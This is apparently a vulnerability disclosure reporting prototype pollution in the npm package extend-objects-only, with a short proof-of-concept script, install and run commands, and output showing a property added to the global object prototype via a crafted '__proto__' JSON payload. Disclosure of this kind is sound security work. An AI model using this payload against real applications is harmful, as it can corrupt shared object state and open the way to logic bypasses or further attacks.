# Description

Prototype Pollution in extend-objects-only

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var { extendObjectsOnly } = require("extend-objects-only")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
extendObjectsOnly(obj, payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i extend-objects-only # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
